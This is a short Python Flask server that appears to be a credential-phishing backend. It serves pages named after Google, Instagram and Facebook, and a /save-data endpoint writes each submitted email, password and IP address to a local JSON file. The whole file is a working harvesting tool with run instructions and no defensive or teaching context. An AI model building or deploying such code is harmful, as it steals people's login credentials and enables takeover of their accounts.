import os
import json
from datetime import datetime
from flask import Flask, request, send_file, jsonify
import sys

app = Flask(__name__)

@app.route("/")
def index():
    return send_file('src/google.html')

@app.route("/insta")
def insta():
    return send_file('src/instagram.html')

@app.route("/face")
def facebook():
    return send_file('src/facebook.html')

@app.route('/save-data', methods=['POST'])
def save_data():
    data = request.json
    email = data.get('email')
    password = data.get('password')
    
   
    ip_address = data.get('ip') if data.get('ip') else request.remote_addr
    print(f"Extracted IP Address from frontend or server: {ip_address}")

    timestamp = datetime.utcnow().isoformat()

    data_entry = {
        "email": email,
        "password": password,
        "ip": ip_address,
        "timestamp": timestamp
    }

    if os.path.exists('data.json'):
        with open('data.json', 'r') as file:
            try:
                existing_data = json.load(file)
            except json.JSONDecodeError:
                existing_data = []
    else:
        existing_data = []

    existing_data.append(data_entry)

    with open('data.json', 'w') as file:
        json.dump(existing_data, file, indent=4)

    return jsonify({"message": "Data saved successfully"}), 200


def main():
    if len(sys.argv) != 2:
        print("Usage: python main.py <port>")
        sys.exit(1)
    
    port = int(sys.argv[1])  

    app.run(port=port, debug=True)

if __name__ == "__main__":
    main()
